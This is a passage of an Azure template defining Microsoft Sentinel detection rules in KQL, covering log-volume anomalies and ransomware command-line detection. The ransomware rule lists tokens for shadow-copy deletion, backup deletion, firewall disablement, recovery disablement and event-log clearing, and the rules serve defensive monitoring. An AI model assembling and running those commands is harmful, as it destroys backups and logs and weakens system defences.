          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1936: [SOC] EntraID - Suspected AzureHound Based Account Takeover {{bv_user}}",
            "alertDescriptionFormat": "{{ExtendedDescription}}\n\nMITRE: T1078 MITRE: T1187 MITRE: T1557\ntag: SOC"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                },
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user_display"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip1"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip2"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip3"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-60105')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-60105')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-60105: [Expedite] Log Volume Anomaly",
          "description": "This detection identifies significant deviations in log ingestion volumes from monitored hosts. It compares recent log counts against established baseline averages from the previous 14 days and alerts when volumes drop below expected thresholds. Such anomalies may indicate logging failures, service interruptions, or potential attempts to evade security monitoring. MITRE:  Category: Sentinel Usage tag: Expedite",
          "severity": "Medium",
          "enabled": false,
          "query": "let start_time = 1d;\nlet end_time = startofday(now()); \nlet suppression_time = 2d;\nlet start_time_historical = 14d;\nlet alert_bin = 1d;\nlet RecentAlerts = toscalar(SecurityAlert\n|where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-60105:'\n|parse AlertName with * ' Anomaly ' * 'From ' host_name\n|summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n);\nlet initData = materialize(CommonSecurityLog\n    | where TimeGenerated between ( ago(start_time_historical) .. end_time )\n    | project Computer, TimeGenerated, DeviceName, DeviceAddress\n    // Normalize device name - should we also flatten the case to lower/upper?\n    | extend Computer = iif(isempty(Computer)\n        ,iif(isnotempty(DeviceName), DeviceName, DeviceAddress)\n        ,Computer)\n    | where tolower(Computer) matches regex tolower(BV60105_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts)\n    // ipv4_is_in_range *seems* less impactful on performance than a regex.\n    | extend Computer = iff(isnotnull(ipv4_is_in_range(Computer, '1.1.1.1/32')), Computer, (split(Computer, \".\")[0]))\n    // toss out malformed logs with empty computer\n    | where isnotempty(Computer));\ninitData\n| make-series EventCount = count() on TimeGenerated from ago(start_time_historical) to end_time step alert_bin by Computer\n| extend series_stats(EventCount), Outlier=series_outliers(EventCount,'ctukey') // extends series info about the last start_time_historical\n| extend EventsSecondToLastBin = EventCount[-2] // get yesterday's events for a delta calculation\n| mvexpand EventCount to typeof(double), Outlier to typeof(double), TimeGenerated to typeof(datetime)\n| extend EventsLastBin = round(EventCount, 3), AverageEventsPerDay = round(series_stats_EventCount_avg,3)\n| extend Delta = EventsLastBin-EventsSecondToLastBin\n| extend DeltaPercentage = round(((Delta)/EventsSecondToLastBin)*100,1)\n                              |extend day_of_week = toint(dayofweek(now())/1d)\n                      |extend day_name = case(\n                          day_of_week == '1', 'monday'\n                          ,day_of_week == '2', 'tuesday'\n                          ,day_of_week == '3', 'wednesday'\n                          ,day_of_week == '4', 'thursday'\n                          ,day_of_week == '5', 'friday'\n                          ,day_of_week == '6', 'saturday'\n                          ,day_of_week == '0', 'sunday'\n                          ,'')\n            | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n      | extend threshold = case(\n          day_name has_any ('saturday', 'sunday'), 80, // Default weekend threshold\n          week_day == true, 50,                       // Default weekday threshold\n          50)\n      // Apply configured thresholds if present\n      | extend threshold = case(\n          day_name in (BV60105_CONFIG['THRESHOLD'][0]['day_name']), BV60105_CONFIG['THRESHOLD'][0]['value'],\n          week_day == BV60105_CONFIG['THRESHOLD'][1]['week_day'], BV60105_CONFIG['THRESHOLD'][1]['value'],\n          threshold)\n| where isfinite(DeltaPercentage) and DeltaPercentage > threshold\n// 1.0 seems a good place for outlier thresholding, since weekend drops and weekday jumps will reduce the Tukey outlier value a bit.\n// good place for tweaking.\n| where abs(Outlier) >= BV60105_CONFIG['OUTLIERTHRESHOLD'] \n// This segment used to throw out any machines that don't show up at least 10 days ago. Newly logging machines shouldn't be alerted on.\n// could use some logic adjustment, this is a very simplistic approach.\n| join kind=innerunique ( initData | summarize First = min(TimeGenerated) by Computer ) on Computer\n| where now() - First > 10d\n| project Tags = 'tag: Custom Health' \n        , bv_start_time = First\n        , bv_end_time = now()\n        , bv_datatype = 'CommonSecurityLog'\n        , bv_mss_category = 'Volume Anomaly'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-60105'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = DeltaPercentage\n        , bv_severity = 'medium'\n        , sourcetype = 'CommonSecurityLog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = series_stats_EventCount_max\n        , bv_min_count = series_stats_EventCount_min\n        , bv_avg_count = round(AverageEventsPerDay,0)           \n| extend ExtendedDescription = strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, max log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\")\n|project-keep  bv_*, ExtendedDescription, Tags, sourcetype",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-09-06T00:00:00.000Z",
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-60105: [Expedite] Log Volume Anomaly From {{bv_src_dvc}}",
            "alertDescriptionFormat": "This detection identifies significant deviations in log ingestion volumes from monitored hosts. It compares recent log counts against established baseline averages from the previous 14 days and alerts when volumes drop below expected thresholds. Such anomalies may indicate logging failures, service interruptions, or potential attempts to evade security monitoring.\n{{ExtendedDescription}} \nCategory: Volume Anomaly\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1503')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1503')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1503: [SOC] Windows - Common Ransomware CommandLines",
          "description": "This alerts every time there is a suspicious command-line that might be indicative of ransomware activities (e.g. deletion of volume shadow copies, system backup deletion, disablement of windows firewall, etc.). MITRE: T1059 Category: DefenderXDR,Microsoft Defender XDR,Windows Security Events tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;  \nlet VolumeShadowCopyDeletionTokens = dynamic(['wmic', 'vssadmin', 'resize', 'shadowstorage', 'shadowcopy', 'delete', 'shadows', 'win32_shadowcopy']);\nlet SystemBackupDeletionTokens = dynamic(['wbadmin', 'delete', 'systemstatebackup', 'catalog']);\nlet SensitiveDefFirewallGroupEnablementTokens = dynamic(['netsh', 'advfirewall', 'network', 'discovery', 'file', 'printer', 'sharing', 'enable', 'yes']);\nlet DefFirewallDisablementTokens = dynamic(['netsh', 'advfirewall', 'currentprofile', 'off', 'opmode', 'disable']);\nlet AutomaticRepairDisablementTokens = dynamic(['bcdedit', 'set', 'bootstatuspolicy', 'ignoreallfailures', 'recoveryenabled', 'no']);\nlet EventLogClearingDisablementTokens = dynamic(['wevtutil', 'cl', 'e', 'false']);\nlet AllTokens = array_concat(VolumeShadowCopyDeletionTokens, SystemBackupDeletionTokens, SensitiveDefFirewallGroupEnablementTokens, DefFirewallDisablementTokens, AutomaticRepairDisablementTokens, EventLogClearingDisablementTokens);\nlet EventIDList = dynamic([4688]);\nunion isfuzzy=true\n(SecurityEvent\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where isnotempty(CommandLine) and CommandLine has_any (AllTokens)\n| project TimeGenerated, CommandLine, TargetUserName, SubjectUserName, Computer, bv_sourcetype = Type\n),\n(DeviceProcessEvents\n|where TimeGenerated between (ago(start_time +latency) .. now()) and ingestion_time() > ago(start_time)\n| where ActionType == 'ProcessCreated' and strlen(ProcessCommandLine) > 5 and ProcessCommandLine has_any (AllTokens)\n| project CommandLine = ProcessCommandLine, TimeGenerated, SubjectUserName = AccountName, TargetUserName = '', Computer = DeviceName, bv_sourcetype = Type\n)\n// ************************************************************************* \n//       <Exclusions>\n// *************************************************************************\n| mv-apply e = A1503_EXCLUSIONS on (\n    extend keys = bag_keys(e) \n    | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n    | extend bv_src_user_excluded = iff(SubjectUserName contains e.bv_src_user, true, false)\n    | extend bv_dest_user_excluded = iff(TargetUserName contains e.bv_dest_user, true,false)\n    | extend bv_process_excluded = iff(array_length(set_intersect(split(CommandLine, ' '), split(e.bv_process_command_line, ' '))) > 0, true,false)\n    | extend excluded_count = \n            iff(bv_src_user_excluded and isnotempty(e.bv_src_user), 1,0)\n            + iff(bv_dest_user_excluded and isnotempty(e.bv_dest_user), 1,0)\n            + iff(bv_process_excluded and isnotempty(e.bv_process_command_line), 1,0)\n    | extend excluded = iff(excluded_count == key_count and key_count != 0 , true, false)\n    | extend bv_exclusion_reason = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize excluded=make_set(excluded), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n)\n| extend ExcludedEvent = iff(excluded contains 'true', true, false)\n// ************************************************************************* \n//       </Exclusions>\n// *************************************************************************\n| where not(ExcludedEvent)\n| extend ParsedMessage = extract_all(@'([^\\s]+)', tolower(CommandLine))\n| extend endingprocess = extract(@'([^\\\\]*)$', 1, tolower(ParsedMessage[0]))\n| extend ParsedMessage = array_concat(ParsedMessage, pack_array(endingprocess))\n| extend CntOfVolumeShadowCopyDeletionTokens = array_length(set_intersect(VolumeShadowCopyDeletionTokens, ParsedMessage))\n    , CntOfSystemBackupDeletionTokens = array_length(set_intersect(SystemBackupDeletionTokens, ParsedMessage))\n    , CntOfSensitiveDefFirewallGroupEnablementTokens = array_length(set_intersect(SensitiveDefFirewallGroupEnablementTokens, ParsedMessage))\n    , CntOfDefFirewallDisablementTokens = array_length(set_intersect(DefFirewallDisablementTokens, ParsedMessage))\n    , CntOfAutomaticRepairDisablementTokens = array_length(set_intersect(AutomaticRepairDisablementTokens, ParsedMessage))\n    , CntOfEventLogClearingDisablementTokens = array_length(set_intersect(EventLogClearingDisablementTokens, ParsedMessage))\n| where CntOfVolumeShadowCopyDeletionTokens >= 3 or (CntOfSystemBackupDeletionTokens >= 2 and ParsedMessage has 'wbadmin') or CntOfSensitiveDefFirewallGroupEnablementTokens >= 6 or CntOfDefFirewallDisablementTokens >= 4 or CntOfAutomaticRepairDisablementTokens >= 4 or CntOfEventLogClearingDisablementTokens >= 2\n| summarize bv_event_count = count(), bv_dest_user = make_set(TargetUserName, 10), bv_src_dvc = make_set(Computer, 10), bv_start_time = min(TimeGenerated), bv_process_command_line = make_set(CommandLine, 10) by bv_src_user = SubjectUserName, bin_at(TimeGenerated,alert_bin, now()), bv_sourcetype\n| extend ExtendedDescription = strcat(\n    'bv_start_time: ', bv_start_time\n    ,'\\nbv_src_user: ', bv_src_user\n    ,'\\nbv_dest_user: ', bv_dest_user\n    ,'\\nbv_dest_user_cnt: ',  array_length(bv_dest_user)\n    ,'\\nbv_src_dvc: ', bv_src_dvc\n    ,'\\nbv_process_command_line: ', array_slice(bv_process_command_line, 0, 3)\n    ,'\\nbv_sourcetype: ', bv_sourcetype)\n| extend VictimEntity = bv_dest_user, AttackerEntity = pack_array(bv_src_user)\n| extend bv_mapping_tag = bv_src_user\n| project \n    bv_start_time\n    , bv_src_user\n    , bv_dest_user\n    , bv_src_dvc\n    , bv_event_count\n    , bv_process_command_line\n    , ExtendedDescription\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore = 3\n    , bv_mapping_tag\n    , bv_sourcetype = iff(bv_sourcetype has 'SecurityEvent', strcat('Windows ', bv_sourcetype), strcat('Defender ', bv_sourcetype))",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1503: [SOC] {{bv_sourcetype}} - Common Ransomware CommandLines",
            "alertDescriptionFormat": "This alerts every time there is a suspicious command-line that might be indicative of ransomware activities (e.g. deletion of volume shadow copies, system backup deletion, disablement of windows firewall, etc.).\n\n{{ExtendedDescription}}\n\nMITRE: T1059\nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_src_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-60109')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-60109')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-60109: [Expedite] Log Ingestion Outlier",
          "description": "This alert identifies when a Microsoft Sentinel table ingestion volume for the last 24 hours is an outlier compared with the last 14 days. MITRE:  Category: Sentinel Usage tag: Expedite",
          "severity": "Medium",
          "enabled": true,
          "query": "let latency = 0d;\nlet start_time = 1d;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;\nlet end_time = startofday(now());\nlet alert_bin = 1d; \nlet OutlierThreshold = BV60109_CONFIG['OUTLIER_THRESHOLD']; // Default: 1.0\nlet DecreasePercentageThreshold = BV60109_CONFIG['DECREASE_THRESHOLD']; // Default: 30.0\nlet IncreasePercentageThreshold = BV60109_CONFIG['INCREASE_THRESHOLD']; //Default: 200.0\nlet GBPerDayThreshold = BV60109_CONFIG['GB_PER_DAY_THRESHOLD']; // Default: 2.0\nlet RecentAlerts = toscalar(SecurityAlert\n|where TimeGenerated between (ago(suppression_time) .. now())\n| where AlertName startswith 'BV-60109:'\n|parse AlertName with * ' Log Ingestion Outlier ' * 'From ' data_type\n|summarize make_set_if(data_type, isnotempty(data_type))\n);\nlet OutlierData = materialize(\n    Usage\n    | make-series currentDataVolume = sum(Quantity)/1000 on TimeGenerated from ago(start_time_historical) to end_time step alert_bin by DataType\n    | where DataType !in~ (BV60109_CONFIG['EXCLUSIONS']) and DataType !in~ (RecentAlerts)\n   | extend series_stats(currentDataVolume), Outlier=series_outliers(currentDataVolume,'ctukey')\n    | mvexpand currentDataVolume to typeof(double), Outlier to typeof(double), TimeGenerated to typeof(datetime)\n    | project DataType, TimeGenerated, DataVolumeGBLast24h = round(currentDataVolume, 3) , Outlier, AverageGBVolumePerDayLast14d = round(series_stats_currentDataVolume_avg,3)\n    | where DataVolumeGBLast24h >= GBPerDayThreshold\n    | extend DeltaPercentage = round((DataVolumeGBLast24h/AverageGBVolumePerDayLast14d-1)*100,1)\n    | where isfinite(DeltaPercentage)\n    | where abs(Outlier) >= OutlierThreshold\n    | extend Outlier = round(Outlier,2)\n    | where TimeGenerated >= ago(start_time)\n    | join kind=innerunique (\n        Usage\n        | where TimeGenerated > ago(start_time_historical)\n        | summarize First = min(TimeGenerated) by DataType\n    ) on DataType\n    | where now() - First > 10d\n    | project-away First, DataType1\n);\nlet increaseAlerts = (\n    OutlierData\n    | where DeltaPercentage >= IncreasePercentageThreshold\n    | sort by TimeGenerated desc, DeltaPercentage desc\n    | extend bv_alarm_subtype = 'Usage - increase'\n        , bv_alarm_threshold = tostring(IncreasePercentageThreshold)\n    | extend ExtendedDescription = strcat(\n        'This alert identifies when a Microsoft Sentinel table ingestion volume for the last 24 hours is an outlier compared with the last 14 days. '\n        , 'Table ', DataType \n        , ' has been identified as experiencing a ', DeltaPercentage\n        , '% increase in comparison with the previous 14 days. The last 24 hours ingestion volume was ', DataVolumeGBLast24h\n        , ' GB vs. ', AverageGBVolumePerDayLast14d\n        ,' daily average for the last 14 days.'\n    )\n);\nlet decreaseAlerts = (\n   OutlierData\n    | where DeltaPercentage <= DecreasePercentageThreshold\n    | sort by TimeGenerated desc, DeltaPercentage desc\n    | extend bv_alarm_subtype = 'Usage - decrease'\n        , bv_alarm_threshold = tostring(DecreasePercentageThreshold)\n    | extend ExtendedDescription = strcat(\n        'This alert identifies when a Microsoft Sentinel table ingestion volume for the last 24 hours is an outlier compared with the last 14 days. '\n        , 'Table ', DataType\n        , ' has been identified as experiencing a ', DeltaPercentage\n        , '% decrease in comparison with the previous 14 days. The last 24 hours ingestion volume was ', DataVolumeGBLast24h\n        , ' GB vs. ', AverageGBVolumePerDayLast14d\n        ,' daily average for the last 14 days.'\n    )\n);\nunion increaseAlerts, decreaseAlerts\n| extend bv_start_time = TimeGenerated\n    , bv_datatype = DataType\n    , bv_mss_category = 'Ingestion outlier'\n    , bv_alarm_type = 'Usage'\n    , bv_alarm_name = 'BV-60109'\n    , bv_alarm_value = DeltaPercentage\n    , bv_severity = 'medium'\n    , Tags = 'tag: Custom Health'    \n| project-reorder TimeGenerated, DataType, DataVolumeGBLast24h, AverageGBVolumePerDayLast14d, DeltaPercentage, Outlier, ExtendedDescription, Tags, bv_start_time, bv_datatype, bv_mss_category, bv_alarm_type, bv_alarm_subtype, bv_alarm_name, bv_alarm_threshold, bv_alarm_value, bv_severity",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-09-05T00:00:00.000Z",
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-60109: [Expedite] Log Ingestion Outlier From {{bv_datatype}}",
            "alertDescriptionFormat": "This alert identifies when a Microsoft Sentinel table ingestion volume for the last 24 hours is an outlier compared with the last 14 days.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9054')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9054')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9054: [Health] CommonSecurityLog - Ingestion - Decrease In Log Volumes (High-volume Hosts)",
          "description": "This alert identifies a significant decrease in log volume for a specific host in the CommonSecurityLog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected to be greater than 100,000 per day. MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": true,
          "query": "let latency = 0h;  \nlet start_time = 1h;\nlet end_time = now(); \nlet DeviationSlider = 2;\nlet DeviationThreshold = 100;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;   \nlet RecentAlerts = toscalar(SecurityAlert\n  |where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9054:'\n  |parse AlertName with * ' Decrease In ' * 'From ' host_name\n  |summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n  );      \nlet Previous9053Alerts = toscalar(SecurityAlert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has 'BV-9053:'\n  | parse AlertName with * 'offline' * '[' host ']'\n  | extend host = split(replace_string(host, '\"', ''), ',')\n  | summarize make_set_if(host, host[0] <> ''));         \nlet Baseline = CommonSecurityLog\n| where TimeGenerated between (startofday(ago(start_time_historical)) .. endofday(ago(1d)))\n| project Computer, TimeGenerated, DeviceName, DeviceVendor, DeviceProduct\n| extend Computer = iif(isnotempty(Computer), DeviceName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9054_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\nand tolower(DeviceVendor) matches regex tolower(BV9054_CONFIG['EXCLUDED_HOST']) == false and tolower(DeviceProduct) matches regex tolower(BV9054_CONFIG['EXCLUDED_HOST']) == false\n| project Computer, TimeGenerated\n| summarize EventCount = count() by Computer, bin(TimeGenerated, 1d)\n| summarize percentile_EventCount_25=percentiles(EventCount, 25),percentile_EventCount_75=percentiles(EventCount, 75),percentile_EventCount50=percentiles(EventCount, 50),MaxCount=max(EventCount),AvgCount=avg(EventCount),MinCount=min(EventCount), NumberofDays = countif(isnotempty(TimeGenerated)) by Computer\n| extend CandleBody = percentile_EventCount_75 - percentile_EventCount_25\n      | extend MyDeviation = CandleBody * DeviationSlider\n      | where MyDeviation  > DeviationThreshold and NumberofDays >= 3\n      | where AvgCount >= 100000\n;\nCommonSecurityLog\n| where TimeGenerated between (startofday(ago(1d)) .. startofday(now()))\n| project Computer, TimeGenerated, DeviceName, DeviceVendor, DeviceProduct\n| extend Computer = iif(isnotempty(Computer), DeviceName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9054_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\nand tolower(DeviceVendor) matches regex tolower(BV9054_CONFIG['EXCLUDED_HOST']) == false and tolower(DeviceProduct) matches regex tolower(BV9054_CONFIG['EXCLUDED_HOST']) == false\n| project Computer, TimeGenerated\n| summarize TodayEventCount = count() by Computer\n| join kind=inner (Baseline) on Computer\n      | extend AlertThreshold = iff(MinCount < MyDeviation, MyDeviation-MinCount, MinCount-(MyDeviation))\n      , PercentBelowMin = round(100- ((TodayEventCount * 1.0)/(MinCount * 1.0) * 100), 2)\n                        |extend day_of_week = toint(dayofweek(now())/1d)\n                |extend day_name = case(\n                    day_of_week == '1', 'monday'\n                    ,day_of_week == '2', 'tuesday'\n                    ,day_of_week == '3', 'wednesday'\n                    ,day_of_week == '4', 'thursday'\n                    ,day_of_week == '5', 'friday'\n                    ,day_of_week == '6', 'saturday'\n                    ,day_of_week == '0', 'sunday'\n                    ,'')\n      | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n| extend threshold = case(\n    day_name has_any ('saturday', 'sunday'), 95, // Default weekend threshold\n    week_day == true, 60,                       // Default weekday threshold\n    50)\n// Apply configured thresholds if present\n| extend threshold = case(\n    day_name in (BV9051_CONFIG['THRESHOLD'][0]['day_name']), BV9051_CONFIG['THRESHOLD'][0]['value'],\n    week_day == BV9051_CONFIG['THRESHOLD'][1]['week_day'], BV9051_CONFIG['THRESHOLD'][1]['value'],\n    threshold)\n, PercentBelowMin = iff(PercentBelowMin < 0, -PercentBelowMin, PercentBelowMin)\n, PercentBelowAvg = round(100- ((TodayEventCount * 1.0)/(AvgCount * 1.0) * 100), 2)\n| where TodayEventCount < AlertThreshold or PercentBelowMin > threshold\n| where PercentBelowAvg > threshold\n| extend Tags = 'tag: Health' \n        , bv_start_time = now()\n        , bv_datatype = 'CommonSecurityLog'\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-9054'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = PercentBelowMin\n        , bv_severity = 'medium'\n        , sourcetype = 'CommonSecurityLog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = TodayEventCount\n        , bv_min_count = MinCount\n        , bv_avg_count = round(AvgCount,0)\n        , bv_event_threshold = AlertThreshold\n        , bv_percent_below_avg = PercentBelowAvg\n| extend ExtendedDescription = iff(TodayEventCount < AlertThreshold, strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \", representing a \", bv_percent_below_avg, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"),\n              strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"))\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_* ",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": "2025-09-04T00:00:00.000Z",
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9054: [Health] CommonSecurityLog - Ingestion - Decrease In Log Volumes From {{bv_src_dvc}}",
            "alertDescriptionFormat": "This alert identifies a significant decrease in log volume for a specific host in the CommonSecurityLog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected to be greater than 100,000 per day.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9051')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9051')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9051: [Health] CommonSecurityLog - Ingestion - Decrease In Log Volumes (Low-volume Hosts)",
          "description": "This alert identifies a significant decrease in log volume for a specific host in the CommonSecurityLog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected ranging from 1 to 99,999 per day. MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": true,
